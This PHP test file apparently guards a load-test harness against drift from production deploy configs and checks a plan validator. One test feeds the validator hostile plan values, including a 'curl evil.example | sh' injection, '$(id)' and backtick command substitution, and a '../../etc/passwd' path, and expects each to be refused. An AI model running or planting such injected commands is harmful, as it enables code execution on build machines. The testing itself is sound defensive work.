<?php

/*
 * Drift guards for the load-test harness (PR #108). loadtest/ carries three hand-made copies of deploy/ that have no
 * other link to their source: the FrankenPHP Caddyfile (plus `num_threads`, which Caddy cannot set to "auto"), the
 * Caddy upstream that deploy/bin/deploy writes for the live colour, and the list of blue services the production
 * compose file defines. Each guard compares the copy with the original, so a change to deploy/ that is not carried
 * over fails here instead of in a 20-minute runner run. The last test checks that every devops page the load-test
 * docs point at exists.
 */

const LOADTEST_ROOT = __DIR__.'/../../../..';

function loadtestFile(string $path): string
{
    $content = file_get_contents(LOADTEST_ROOT.'/'.$path);
    expect($content)->not->toBeFalse("{$path} should exist");

    return (string) $content;
}

/** @return list<string> */
function loadtestWords(string $shellArray): array
{
    return preg_split('/\s+/', trim($shellArray), -1, PREG_SPLIT_NO_EMPTY);
}

/** Service names of deploy/compose.prod.yaml whose block has `profiles: [blue]`. @return list<string> */
function loadtestBlueServices(): array
{
    preg_match_all('/^    ([a-z0-9-]+):\n((?:        .*\n|\n)*)/m', loadtestFile('deploy/compose.prod.yaml'), $blocks, PREG_SET_ORDER);
    $blue = [];
    foreach ($blocks as [, $name, $body]) {
        if (preg_match('/^\s+profiles: \[blue\]$/m', $body)) {
            $blue[] = $name;
        }
    }
    sort($blue);
    expect($blue)->not->toBeEmpty();

    return $blue;
}

test('the load-test Caddyfile is the production Caddyfile plus num_threads', function () {
    $production = loadtestFile('deploy/frankenphp/Caddyfile');
    $copy = loadtestFile('loadtest/frankenphp/Caddyfile');

    // The copy starts with its own comment, then repeats the production file from its first line on.
    $firstLine = strtok($production, "\n");
    $start = strpos($copy, $firstLine);
    expect($start)->not->toBeFalse('the copy should repeat the production Caddyfile from its first line');

    $expected = preg_replace('/^\tfrankenphp$/m', "\tfrankenphp {\n\t\tnum_threads {\$PHP_THREADS}\n\t}", $production, -1, $replaced);
    expect($replaced)->toBe(1, 'the production Caddyfile should have one bare `frankenphp` directive');
    expect(substr($copy, $start))->toBe($expected);
});

test('the upstream file bin/run writes for blue is what deploy/bin/deploy writes', function () {
    expect(preg_match("/^cat > \"\\\$secrets\\/state\\/live\\/upstream\\.caddy\" <<'CADDY'\n(.*?)^CADDY$/ms", loadtestFile('loadtest/bin/run'), $copy))->toBe(1);
    expect(preg_match("/^write_upstream\\(\\) \\{\n.*?<<CADDY\n(.*?)^CADDY$/ms", loadtestFile('deploy/bin/deploy'), $original))->toBe(1);

    $strip = fn (string $heredoc): string => preg_replace('/^\s*#.*\n/m', '', $heredoc);
    // The deploy heredoc is unquoted: `$1` is the colour and `\$` a literal dollar sign.
    $expected = str_replace(['$1', '\$'], ['blue', '$'], $strip($original[1]));

    expect($strip($copy[1]))->toBe($expected);
});

test('bin/run and the overlay name exactly the blue services of the production stack', function () {
    $blue = loadtestBlueServices();
    $run = loadtestFile('loadtest/bin/run');

    expect(preg_match('/^compose=\((.*)\)$/m', $run, $compose))->toBe(1)
        ->and(loadtestWords($compose[1]))->toContain('--profile', 'blue');

    expect(preg_match('/^stack=\((.*)\)$/m', $run, $stack))->toBe(1);
    $stack = loadtestWords($stack[1]);
    sort($stack);
    $expected = [...$blue, 'caddy'];
    sort($expected);
    expect($stack)->toBe($expected);

    expect(preg_match('/^pools=\((.*)\)$/m', $run, $pools))->toBe(1);
    $pools = loadtestWords($pools[1]);
    sort($pools);
    expect($pools)->toBe(array_values(array_filter($blue, fn (string $s) => str_starts_with($s, 'worker-') && $s !== 'worker-automation-blue')));

    preg_match_all('/^    ([a-z0-9-]+):$/m', loadtestFile('loadtest/compose.loadtest.yaml'), $overlay);
    $overlayBlue = array_values(array_filter($overlay[1], fn (string $s) => str_ends_with($s, '-blue')));
    sort($overlayBlue);
    expect($overlayBlue)->toBe($blue)
        ->and(array_filter($overlay[1], fn (string $s) => str_ends_with($s, '-green')))->toBeEmpty();

    preg_match_all('/^    ([a-z0-9-]+):$/m', loadtestFile('deploy/compose.prod.yaml'), $production);
    expect(array_values(array_diff($overlay[1], $production[1])))->toBe(['k6']);
});

test('bin/run removes the slice unit it writes and does not set the same limits twice', function () {
    $run = loadtestFile('loadtest/bin/run');

    expect($run)->toContain('rm -f "/etc/systemd/system/${slice}"')
        ->and($run)->not->toContain('set-property');
});

test('the storefront scenario names its domains per scenario run, so levels do not collide', function () {
    expect(loadtestFile('loadtest/k6/scenarios/storefront.js'))->toContain('lt-${exec.scenario.startTime}-${exec.vu.idInTest}');
});

test('every scenario arrives spread over START_SPREAD, and bin/run passes it to k6', function () {
    // Issue #205: with every virtual user starting in the same second, their sign-ins saturated the 2 vCPU host and
    // made most of the multi-second p95. A scenario exported without arriving() would bring that burst back.
    $main = loadtestFile('loadtest/k6/main.js');
    preg_match('/^const MIX = \{(.*?)\};$/m', $main, $mix);
    preg_match_all('/(\w+): [0-9.]+/', $mix[1] ?? '', $names);
    expect($names[1])->not->toBeEmpty();
    foreach ($names[1] as $name) {
        expect($main)->toContain("export const {$name} = arriving({$name}Scenario);");
    }
    expect($main)->toContain("parseFloat(__ENV.START_SPREAD || '20')")
        ->and(loadtestFile('loadtest/bin/run'))->toContain('start_spread=20')
        ->and(loadtestFile('loadtest/bin/run'))->toContain('-e START_SPREAD="$start_spread"')
        ->and(loadtestFile('loadtest/bin/run'))->toContain('[ "$start_spread" -ge "$(seconds "$d")" ]');
});

test('every docs/devops page the load-test docs point at exists', function () {
    $pages = [];
    foreach (['loadtest/README.md', 'billing/docs/devops/ci.md', '.github/workflows/load-test.yml'] as $doc) {
        preg_match_all('#(?:billing/)?docs/devops/([a-z0-9-]+\.md)#', loadtestFile($doc), $m);
        $pages[$doc] = array_unique($m[1]);
    }

    expect(array_merge(...array_values($pages)))->toContain('sizing.md');
    foreach ($pages as $doc => $names) {
        foreach ($names as $name) {
            expect(file_exists(LOADTEST_ROOT."/billing/docs/devops/{$name}"))->toBeTrue("{$doc} points at billing/docs/devops/{$name}, which does not exist");
        }
    }
});

test('the think-time override defaults to each page\'s own pauses, and bin/run passes it to k6', function () {
    $lib = loadtestFile('loadtest/k6/lib.js');
    $run = loadtestFile('loadtest/bin/run');

    // Unset, every scenario keeps the ranges the earlier runs were measured with (1–3 s unless a page says otherwise).
    expect($lib)->toContain('export function think(min = 1, max = 3) {')
        ->and($lib)->toContain("parseFloat(__ENV.THINK_MIN || '')")
        ->and($lib)->toContain("parseFloat(__ENV.THINK_MAX || '')")
        ->and($run)->toContain('think=""')
        ->and($run)->toContain('think_env=(-e THINK_MIN="${think% *}" -e THINK_MAX="${think#* }")')
        ->and($run)->toContain('${think_env[@]+"${think_env[@]}"}')
        // Checked before anything runs: no 0 s pause, and a warm-up duration k6 accepts.
        ->and($run)->toContain('[[ "$think" =~ ^[1-9][0-9]*\\ [1-9][0-9]*$ ]]')
        ->and(strpos($run, '[[ "$warmup" =~ ^[0-9]+[sm]$ ]] || {'))->toBeLessThan(strpos($run, 'for d in "${level_duration:-'));
});

test('bin/run stops one level past saturation by the same rule summarize.py reports', function () {
    $run = loadtestFile('loadtest/bin/run');
    $summarize = loadtestFile('loadtest/bin/summarize.py');

    expect($summarize)->toContain('P95_LIMIT_MS = 1000')
        ->and($summarize)->toContain('ERROR_LIMIT = 0.01')
        ->and($summarize)->toContain('SATURATED = 3')
        ->and($summarize)->toContain("'saturation': saturation(levels)");
    // The exit code bin/run treats as "saturated" is the one --check-level returns.
    expect($run)->toContain('python3 loadtest/bin/summarize.py --check-level "$results/k6-${vus}.json" || rc=$?')
        ->and($run)->toContain('if [ "$rc" = 3 ] || [ "$past_limit" -ge 1 ]; then')
        ->and($run)->toContain('[ "$stop_at_saturation" = 1 ] && [ "$past_limit" -ge 2 ]')
        ->and($run)->toContain('"levels": "${levels_run}".split()');
});

test('the label runs are few, name real profiles and pass the plan rules', function () {
    $plan = json_decode(loadtestFile('loadtest/label-runs.json'), true, flags: JSON_THROW_ON_ERROR);
    $script = loadtestFile('loadtest/bin/plan.py');
    preg_match('/^MAX_LABEL_RUNS = (\d+)$/m', $script, $max);
    preg_match_all("/^    '([a-z_]+)': r'([^']+)',$/m", $script, $rules, PREG_SET_ORDER);
    expect($rules)->not->toBeEmpty();

    expect($plan['runs'])->toBeArray()->not->toBeEmpty()
        ->and(count($plan['runs']))->toBeLessThanOrEqual((int) $max[1]);
    $names = [];
    foreach ($plan['runs'] as $run) {
        expect(file_exists(LOADTEST_ROOT."/loadtest/profiles/{$run['profile']}.env"))->toBeTrue("no profile {$run['profile']}");
        // The standard runner has 4 CPUs: large would be skipped by --require-fit, so a label run of it is wasted.
        expect($run['profile'])->toBeIn(['small', 'medium']);
        foreach ($rules as [, $key, $pattern]) {
            if (isset($run[$key])) {
                expect(preg_match('/^(?:'.$pattern.')$/', (string) $run[$key]))->toBe(1, "{$key} {$run[$key]}");
            }
        }
        $names[] = $run['name'];
    }
    expect(array_unique($names))->toHaveCount(count($names));
});

test('the load-test workflow takes its matrix from plan.py and keeps the label path on the standard runner', function () {
    $workflow = loadtestFile('.github/workflows/load-test.yml');
    $script = loadtestFile('loadtest/bin/plan.py');

    expect($workflow)->not->toContain('pull_request_target')
        ->and($workflow)->toContain("permissions:\n    contents: read")
        ->and($workflow)->toContain('python3 loadtest/bin/plan.py --label loadtest/label-runs.json')
        ->and($workflow)->toContain("runs-on: \${{ github.event_name == 'workflow_dispatch' && inputs.runner || 'ubuntu-24.04' }}")
        ->and($workflow)->toContain("ALLOW_SMALLER: \${{ github.event_name == 'workflow_dispatch' && inputs.allow_smaller_runner && '1' || '' }}")
        ->and(substr_count($workflow, 'uses: actions/checkout@'))->toBe(substr_count($workflow, 'persist-credentials: false'));

    // Every matrix key the workflow reads is one plan.py emits.
    preg_match("/out = \{(.*?)\*\*defaults\}/s", $script, $out);
    preg_match_all("/'([a-z_]+)':/", $out[1] ?? '', $keys);
    preg_match_all('/matrix\.([a-z_]+)/', $workflow, $used);
    expect(array_values(array_diff(array_unique($used[1]), $keys[1])))->toBe([]);
});

test('a billing day that does not finish is reported, not summed to a short time', function () {
    // Run 41198972155: on the small profile automation:run stopped after two tasks and the summary said "0.0 s".
    expect(loadtestFile('loadtest/bin/run'))->toContain('|| automation_rc=$?')
        ->and(loadtestFile('loadtest/bin/run'))->toContain('> "$results/automation-exit.json"')
        ->and(loadtestFile('loadtest/bin/summarize.py'))->toContain("load(run / 'automation-exit.json', {})");
});

/** Runs loadtest/bin/plan.py --label on $plan. @return array{int, string, string} exit code, stdout, stderr */
function loadtestPlan(array $plan): array
{
    $file = tempnam(sys_get_temp_dir(), 'pr543-plan-');
    file_put_contents($file, json_encode($plan, JSON_THROW_ON_ERROR));
    $process = proc_open(['python3', LOADTEST_ROOT.'/loadtest/bin/plan.py', '--label', $file], [1 => ['pipe', 'w'], 2 => ['pipe', 'w']], $pipes);
    expect($process)->not->toBeFalse('python3 should run plan.py');
    $out = (string) stream_get_contents($pipes[1]);
    $err = (string) stream_get_contents($pipes[2]);
    $status = proc_close($process);
    unlink($file);

    return [$status, $out, $err];
}

test('plan.py turns a valid plan into the matrix', function () {
    [$status, $out] = loadtestPlan(['runs' => [['name' => 'a', 'profile' => 'small', 'levels' => '50 100', 'think' => '10 30']]]);

    expect($status)->toBe(0)
        ->and(json_decode($out, true)[0])->toMatchArray(['name' => 'a', 'profile' => 'small', 'levels' => '50 100', 'think' => '10 30']);
});

test('plan.py refuses a hostile or wasteful plan before anything reaches a shell', function (array $runs, string $reason) {
    [$status, $out, $err] = loadtestPlan(['runs' => $runs]);

    // A refused plan prints no matrix, so the load job never starts.
    expect($status)->not->toBe(0)
        ->and($out)->toBe('')
        ->and($err)->toContain($reason);
})->with([
    'unknown key' => [[['profile' => 'small', 'secrets' => 'inherit']], "unknown key 'secrets'"],
    'runner' => [[['profile' => 'small', 'runner' => 'self-hosted']], "unknown key 'runner'"],
    'allow_smaller_runner' => [[['profile' => 'large', 'allow_smaller_runner' => true]], "unknown key 'allow_smaller_runner'"],
    'command in levels' => [[['profile' => 'small', 'levels' => '5; curl evil.example | sh']], 'levels'],
    'substitution in name' => [[['profile' => 'small', 'name' => 'a$(id)']], 'name'],
    'backticks in duration' => [[['profile' => 'small', 'level_duration' => '1m`id`']], 'level_duration'],
    'newline in think' => [[['profile' => 'small', 'think' => "10 30\nid"]], 'think'],
    'unknown profile' => [[['profile' => '../../etc/passwd']], 'profile must be one of'],
    'more than 3 runs' => [array_fill(0, 4, ['profile' => 'small']), '1 to 3 runs'],
    'no runs' => [[], '1 to 3 runs'],
    'think 0 0' => [[['profile' => 'small', 'think' => '0 0']], 'think'],
    'think minimum 0' => [[['profile' => 'small', 'think' => '0 30']], 'think'],
    'think reversed' => [[['profile' => 'small', 'think' => '30 10']], 'the smaller number first'],
]);

test('k6 counts error statuses per page in the classes summarize.py reads, and the limited storefront pages allow 429 (#567)', function () {
    $lib = loadtestFile('loadtest/k6/lib.js');
    $summarize = loadtestFile('loadtest/bin/summarize.py');

    preg_match("/^export const STATUS_CLASSES = (\[.*\]);$/m", $lib, $js);
    preg_match("/^STATUS_CLASSES = (\[.*\])$/m", $summarize, $py);
    expect($js[1] ?? null)->not->toBeNull()
        ->and($js[1] ?? null)->toBe($py[1] ?? null)
        ->and(loadtestFile('loadtest/k6/main.js'))->toContain('thresholds[`status_${statusClass}{page:${page}}`]')
        ->and($summarize)->toContain("values(metrics, f'status_{c}{{page:{page}}}')")
        ->and(loadtestFile('loadtest/k6/scenarios/storefront.js'))->toContain('visit(anonymous, path, name, {}, { limited: true });');
});
